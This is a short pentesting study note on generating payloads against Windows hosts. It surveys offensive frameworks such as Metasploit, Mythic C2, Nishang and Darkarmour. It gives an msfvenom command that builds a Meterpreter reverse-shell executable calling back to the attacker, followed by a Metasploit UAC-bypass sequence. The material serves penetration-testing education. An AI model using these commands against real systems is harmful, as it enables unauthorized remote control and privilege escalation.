---
title: Windows Payload Generation
category: Access
tags: [download, upload, wget, curl]
tools: ['ftp', 'openssl', 'python', 'impacket-smb-server']
---

# Windows Payloads

## Payload Generation

We have plenty of good options for dealing with generating payloads  to use against Windows hosts. We touched on some of these already in  previous sections. For example, the Metasploit-Framework and MSFVenom is a very handy way to generate payloads since it is OS agnostic. The  table below lays out some of our options. However, this is not an  exhaustive list, and new resources come out daily.

| **Resource**                      | **Description**                                              |
| --------------------------------- | ------------------------------------------------------------ |
| `MSFVenom & Metasploit-Framework` | [Source](https://github.com/rapid7/metasploit-framework) MSF is an extremely versatile tool for any pentester's toolkit. It  serves as a way to enumerate hosts, generate payloads, utilize public  and custom exploits, and perform post-exploitation actions once on the  host. Think of it as a swiss-army knife. |
| `Payloads All The Things `        | [Source](https://github.com/swisskyrepo/PayloadsAllTheThings) Here, you can find many different resources and cheat sheets for payload generation and general methodology. |
| `Mythic C2 Framework`             | [Source](https://github.com/its-a-feature/Mythic) The Mythic C2 framework is an alternative option to Metasploit as a  Command and Control Framework and toolbox for unique payload generation. |
| `Nishang`                         | [Source](https://github.com/samratashok/nishang) Nishang is a framework collection of Offensive PowerShell implants and  scripts. It includes many utilities that can be useful to any pentester. |
| `Darkarmour`                      | [Source](https://github.com/bats3c/darkarmour) Darkarmour is a tool to generate and utilize obfuscated binaries for use against Windows hosts. |

## [MSVENOM](../Exploitation/msvenom.md) 

**Common**

## Example: Generating a Windows Meterpreter Payload

A common approach is to use `windows/meterpreter/reverse_tcp` payload:

```
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<YOUR_IP> LPORT=4444 -f exe -o shell.exe
```

This command generates an executable that, when run on the target system,  establishes a reverse connection to the attacker’s machine.

## Bypassing UAC for Privilege Escalation

Once a foothold is gained, attackers can attempt to bypass User Account Control (UAC):

```
use exploit/windows/local/bypassuac
set SESSION <SESSION_ID>
set PAYLOAD windows/meterpreter/reverse_tcp
exploit
```

